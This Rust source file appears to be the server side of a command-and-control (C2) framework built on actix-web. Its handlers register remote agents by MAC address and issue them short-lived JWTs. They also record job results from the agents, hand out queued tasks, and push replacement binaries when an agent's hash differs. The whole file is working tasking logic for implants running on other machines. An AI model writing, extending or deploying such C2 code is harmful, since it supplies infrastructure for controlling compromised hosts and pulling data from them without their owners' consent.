use crate::entities::{Agent, Job};
use crate::utils::C2HttpResponse;
use crate::utils::{authenticate_jwt, JwtClaim};
use crate::{dao, utils, CcState};
use actix_web::http::header::AUTHORIZATION;
use actix_web::{get, post, put, web};
use common::*;
use std::str::FromStr;

pub fn config(cfg: &mut web::ServiceConfig) {
    cfg.service(root).service(identfikatsiya).service(zadacha);
}

#[get("/")]
async fn root() -> actix_web::HttpResponse {
    actix_web::HttpResponse::Ok().body(":)")
}

#[put("/")]
async fn identfikatsiya(
    req: actix_web::HttpRequest,
    body: web::Bytes,
    db_pool: web::Data<sqlx::SqlitePool>,
    state: web::Data<CcState>,
) -> C2HttpResponse {
    let agent = dao::agent::merge(
        &db_pool,
        Agent {
            mac_address: hex::encode(body.to_vec()),
            user_agent: UserAgent::from_str(&utils::get_user_agent(&req)?)?,
            ..Default::default()
        },
    )
    .await?;
    let new_jwt = JwtClaim::new(agent.id, 60).encode(&state.jwt_signing_key)?;
    Ok(actix_web::HttpResponse::Ok()
        .insert_header((AUTHORIZATION, format!("Bearer {new_jwt}")))
        .finish())
}

#[post("/")]
async fn zadacha(
    req: actix_web::HttpRequest,
    db_pool: web::Data<sqlx::SqlitePool>,
    state: web::Data<CcState>,
    notification: web::Json<Notification>,
) -> actix_web::HttpResponse {
    match task_controller(req, db_pool, state, notification).await {
        Ok((new_jwt, next_message)) => actix_web::HttpResponse::Ok()
            .insert_header((AUTHORIZATION, format!("Bearer {new_jwt}")))
            .json(next_message),
        Err(e) => {
            log::error!("C2 error: {}", e);
            actix_web::HttpResponse::Ok().finish()
        }
    }
}

async fn task_controller(
    req: actix_web::HttpRequest,
    db_pool: web::Data<sqlx::SqlitePool>,
    state: web::Data<CcState>,
    notification: web::Json<Notification>,
) -> anyhow::Result<(String, Message)> {
    // Authenticate the agent
    let agent = authenticate_jwt(&req, &db_pool, &state.jwt_signing_key).await?;
    // Update the job
    handle_notification(&db_pool, &agent, notification.into_inner()).await?;
    // Get the next message
    Ok((
        JwtClaim::new(agent.id, 60).encode(&state.jwt_signing_key)?,
        get_next_message(&db_pool, &agent).await?,
    ))
}

async fn handle_notification(
    db_pool: &sqlx::SqlitePool,
    agent: &Agent,
    notification: Notification,
) -> anyhow::Result<()> {
    match notification {
        Notification::Empty => (),

        Notification::StartingJob(job_id) => dao::job::update_running(&db_pool, agent.id, job_id)
            .await
            .map(|_| ())?,

        Notification::Result {
            job_id,
            completed_at,
            result,
        } => dao::job::update_result(&db_pool, agent.id, job_id, completed_at, result.clone())
            .await
            .map(|_| ())?,
    }
    Ok(())
}

async fn get_next_message(db_pool: &sqlx::SqlitePool, agent: &Agent) -> anyhow::Result<Message> {
    if agent.user_agent.hash.ne(&agent.sha256) {
        // Agent update required
        if let Some(bin) = dao::bin::get_bin_by_sha256(&db_pool, &agent.sha256).await? {
            return Ok(Message::Update(bin));
        } else {
            log::error!("No bin found with sha256 {}", agent.sha256); // Not finding a bin OSEF
        }
    }

    // Get the next job
    Ok(dao::job::get_next(&db_pool, agent.id)
        .await?
        .map(Job::try_into)
        .transpose()?
        .unwrap_or_else(|| Message::BananaBread))
}
